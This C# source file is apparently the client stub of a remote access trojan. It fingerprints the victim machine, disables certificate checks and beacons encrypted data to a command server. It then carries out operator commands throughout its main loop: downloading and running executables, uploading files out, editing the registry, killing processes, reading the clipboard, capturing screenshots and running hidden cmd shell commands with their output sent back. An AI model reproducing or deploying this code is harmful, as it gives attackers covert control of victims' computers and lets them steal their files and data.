using common;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace stub
{
    class Core
    {
        [DllImport("avicap32.dll")]
        static extern bool capGetDriverDescriptionA(short wDriverIndex, byte[] lpszName, int cbName, byte[] lpszVer, int cbVer);

        int curInterval = 5000;
        string url, key;
        string id, os, compName, memory, processor, webcam;
      
        public Core(string url, string key)
        {
            ServicePointManager.DefaultConnectionLimit = 10000;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

            this.url = url;
            this.key = key;
            this.id = getID();
            this.compName = Dns.GetHostName();
            this.os = System.Environment.OSVersion.ToString();
            this.memory = getMemory();
            this.processor = getProcessor();
            this.webcam = checkCamera().ToString();
        }

        private string ConstructQueryString(NameValueCollection parameters)
        {
            List<string> items = new List<string>();

            foreach (string name in parameters)
                items.Add(string.Concat(name, "=", System.Web.HttpUtility.UrlEncode(parameters[name])));

            return string.Join("&", items.ToArray());
        }

        private byte[] Encrypt(NameValueCollection parameters)
        {
            string info = ConstructQueryString(parameters);
            return RC4.Encrypt(Encoding.ASCII.GetBytes(key), gzip.Compress(Encoding.ASCII.GetBytes(info)));
        }

        public void loadPage(WebClient query, string toHost)
        {
            try
            {
                NameValueCollection queryParameters = new NameValueCollection()
                {
                    { "mode", "result"},
                    { "id", id},
                    { "result", toHost}
                };
                query.UploadData(url, "POST", Encrypt(queryParameters));
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
            }
        }

        private string getID()
        {
            string outID = null;
            ManagementObjectSearcher query1;
            ManagementObjectCollection queryCollection1;
            query1 = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter");
            queryCollection1 = query1.Get();
            foreach (ManagementObject mo in queryCollection1)
                if (mo["MACAddress"] != null) outID = mo["MACAddress"].ToString().Replace(":", "");
            return outID;
        }

        private string getMemory()
        {
            double totalCapacity = 0;
            ObjectQuery objectQuery = new ObjectQuery("select * from Win32_PhysicalMemory");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(objectQuery);
            ManagementObjectCollection vals = searcher.Get();

            foreach (ManagementObject val in vals)
                totalCapacity += System.Convert.ToDouble(val.GetPropertyValue("Capacity"));

            return (totalCapacity / 1024 / 1024).ToString();
        }

        private string getProcessor()
        {
            string infoOut = null;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT maxclockspeed,  datawidth, name, manufacturer FROM Win32_Processor");
            ManagementObjectCollection objCol = searcher.Get();
            foreach (ManagementObject mgtObject in objCol)
            {
                infoOut = (Convert.ToDecimal(mgtObject["maxclockspeed"]) / 1000).ToString() + "GHz ";
                infoOut += mgtObject["datawidth"].ToString() + "bit ";
                infoOut += mgtObject["name"].ToString();
            }
            return infoOut;
        }

        private string checkCamera()
        {
            string devices = "";

            byte[] lpszName = new byte[100];
            byte[] lpszVer = new byte[100];
            for (int i = 0; i < 10; i++)
            {
                bool ret = capGetDriverDescriptionA((short)i, lpszName, 100, lpszVer, 100);
                if (ret)
                    devices += Encoding.ASCII.GetString(lpszName) + "|";
            }

            if (!string.IsNullOrEmpty(devices))
                return "1";
            else
                return "0";
        }

        public void Start()
        {
            int no_work_count = 0;
            while (true)
            {
                Thread.Sleep(curInterval);

                try
                {
                    WebClient query = new WebClient();

                    var queryParameters = new NameValueCollection()
                    {
                        { "mode", "info" },
                        { "id", id },
                        { "compname", compName },
                        { "os", os },
                        { "ip", utils.GetIP() },
                        { "memory", memory },
                        { "processor", processor },
                        { "webcam", webcam },
                        { "interval", curInterval.ToString() }
                    };

                    byte[] buf = query.UploadData(url, "POST", Encrypt(queryParameters));
                    if (buf.Length == 0)
                    {
                        no_work_count++;

                        if (no_work_count >= 36)
                            curInterval = 180000;
                        if (no_work_count >= 12)
                            curInterval = 60000;
                        if (no_work_count >= 6)
                            curInterval = 30000;
                        continue;
                    }

                    no_work_count = 0;
                    curInterval = 5000;

                    string execute = Encoding.ASCII.GetString(gzip.Decompress(RC4.Decrypt(Encoding.ASCII.GetBytes(key), buf)));
                    string[] executeA = execute.Split('|');

                    string report = "RS" + executeA[0];
                    switch (executeA[0])
                    {
                        case "downloadexe":
                            try
                            {
                                string filename = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + executeA[1].Substring(executeA[1].LastIndexOf("/") + 1);
                                File.Delete(filename);
                                query.DownloadFile(executeA[1], filename);
                                System.Diagnostics.Process.Start(filename);
                            }
                            catch { report = "RF" + executeA[0]; }
                            break;

                        case "download":
                            try
                            {
                                File.WriteAllBytes(executeA[1], gzip.Decompress(utils.GetStringToBytes(executeA[2])));
                            }
                            catch { report = "RF" + executeA[0]; }
                            break;

                        case "upload":
                            report = "LS" + executeA[0] + "{-}";
                            try
                            {
                                report += utils.GetBytesToString(gzip.Compress(File.ReadAllBytes(executeA[1])));
                            }
                            catch { report = "RF" + executeA[0]; }
                            break;

                        case "run":
                            try { System.Diagnostics.Process.Start(executeA[1]); }
                            catch { report = "RF" + executeA[0]; }
                            break;

                        case "delete":
                            string lastCharacter = executeA[1].Substring(executeA[1].Length - 1, 1);
                            try
                            {
                                if (lastCharacter == "/") Directory.Delete(executeA[1], true);
                                else File.Delete(executeA[1]);
                            }
                            catch { report = "RF" + executeA[0]; }
                            break;

                        case "rename":
                            string lastCharacterr = executeA[1].Substring(executeA[1].Length - 1, 1);
                            try
                            {
                                if (lastCharacterr == "/") Directory.Move(executeA[1], executeA[2]);
                                else File.Move(executeA[1], executeA[2]);
                            }
                            catch { report = "RF" + executeA[0]; }
                            break;

                        case "creatdir":
                            try { Directory.CreateDirectory(executeA[1]); }
                            catch { report = "RF" + executeA[0]; }
                            break;

                        case "list":
                            report = "LSlist{-f}";
                            try
                            {
                                string[] foldersA = System.IO.Directory.GetDirectories(executeA[1]);
                                string[] filesA = System.IO.Directory.GetFiles(executeA[1]);
                                for (int i = 0; i < foldersA.Length; i++)
                                    report += foldersA[i].Substring(foldersA[i].LastIndexOf("/") + 1) + "{-f}";
                                report += "{-fbr}";
                                for (int i = 0; i < filesA.Length; i++)
                                {
                                    FileInfo f2 = new FileInfo(filesA[i]);
                                    report += filesA[i].Substring(filesA[i].LastIndexOf("/") + 1) + "{-fi}" + f2.Length.ToString() + "{-fi}" + f2.LastWriteTimeUtc + "{-f}";
                                }
                            }
                            catch { report = "RF" + executeA[0]; ; }
                            break;

                        case "programs":
                            report = "LSprograms{-p}";

                            string SoftwareKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
                            using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(SoftwareKey))
                                foreach (string skName in rk.GetSubKeyNames())
                                    using (RegistryKey sk = rk.OpenSubKey(skName))
                                    {
                                        try
                                        {
                                            if (sk.GetValue("InstallLocation") != null && sk.GetValue("DisplayName") != null)
                                                report += sk.GetValue("DisplayName") + "{-pi}" + sk.GetValue("DisplayVersion") + "{-pi}" + sk.GetValue("Publisher") + "{-pi}" + sk.GetValue("UninstallString") + "{-p}";
                                        }
                                        catch { report = "RFprograms"; }
                                    }
                            if (report.Contains("\"")) report = report.Replace("\"", "");
                            break;

                        case "reglist":
                            report = "LSreglist{-l}";
                            try
                            {
                                if (executeA[1].Contains("//")) executeA[1] = executeA[1].Replace("//", "\\");

                                string[] subKeys = Registry.CurrentUser.OpenSubKey(executeA[1], true).GetSubKeyNames();
                                foreach (string subKeysKey in subKeys)
                                    report += subKeysKey + "{-l}";

                                report += "{-lf}";

                                string[] subKeysF = Registry.CurrentUser.OpenSubKey(executeA[1], true).GetValueNames();
                                foreach (string subKeysKey in subKeysF)
                                {
                                    RegistryKey key = Registry.CurrentUser.OpenSubKey(executeA[1], true);
                                    report += subKeysKey + "{-li}" + key.GetValue(subKeysKey) + "{-l}";
                                }
                            }
                            catch { report = "RF" + executeA[0]; ; }
                            break;

                        case "regnewkey":
                            try
                            {
                                if (executeA[1].Contains("//"))
                                    executeA[1] = executeA[1].Replace("//", "\\");

                                RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(executeA[1]);
                                if (executeA[2] != "{-fol}") key.SetValue(executeA[2], executeA[3]);
                                key.Close();
                            }
                            catch { report = "RF" + executeA[0]; ; }
                            break;

                        case "regdelkey":
                            try
                            {
                                if (executeA[1].Contains("//"))
                                    executeA[1] = executeA[1].Replace("//", "\\");

                                RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(executeA[1]);
                                if (executeA[3] != "{-fol}") key.DeleteSubKey(executeA[2]);
                                else key.DeleteValue(executeA[2]);
                                key.Close();
                            }
                            catch { report = "RF" + executeA[0]; ; }
                            break;

                        case "process":
                            string processDes = null;
                            report = "LS" + executeA[0] + "{-p}";
                            try
                            {
                                Process[] prs = Process.GetProcesses();
                                foreach (Process pr in prs)
                                {
                                    try
                                    {
                                        processDes = FileVersionInfo.GetVersionInfo(pr.MainModule.FileName).FileDescription;
                                    }
                                    catch { processDes = null; }

                                    report += pr.ProcessName + "{-pi}" + pr.PrivateMemorySize + "{-pi}" + processDes + "{-p}";
                                }
                            }
                            catch { report = "RF" + executeA[0]; };
                            break;

                        case "pkill":
                            try
                            {
                                Process[] prs = Process.GetProcesses();
                                foreach (Process pr in prs)
                                    if (pr.ProcessName == executeA[1])
                                        pr.Kill();
                            }
                            catch { report = "RF" + executeA[0]; };
                            break;

                        case "clipboard":
                            report = "LS" + executeA[0] + "{-c}";
                            report += Clipboard.GetText();
                            break;

                        case "clipboardset":
                            Clipboard.SetText(executeA[1]);
                            break;

                        case "screen":
                            report = "LS" + executeA[0] + "{-}";
                            try
                            {
                                Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                                Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                                using (MemoryStream ms = new MemoryStream())
                                {
                                    bmpScreenshot.Save(ms, ImageFormat.Png);
                                    report += utils.GetBytesToString(gzip.Compress(ms.ToArray()));
                                }
                            }
                            catch { report = "RF" + executeA[0]; }
                            break;
                        case "shellexec":
                            report = "LS" + executeA[0] + "{-}";
                            {
                                Process p = new Process();
                                ProcessStartInfo i = new ProcessStartInfo("cmd");
                                i.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                                i.Arguments = "/C " + executeA[1];
                                i.RedirectStandardOutput = true;
                                i.UseShellExecute = false;
                                i.CreateNoWindow = true;
                                i.ErrorDialog = false;
                                p.StartInfo = i;
                                p.Start();
                                report += p.StandardOutput.ReadToEnd();
                            }
                            break;
                        case "close":
                            Environment.Exit(0);
                            break;
                    }

                    loadPage(query, report);
                }
                catch (Exception ex)
                {
                    //Console.WriteLine(ex.Message);
                }
            }
        }
    }
}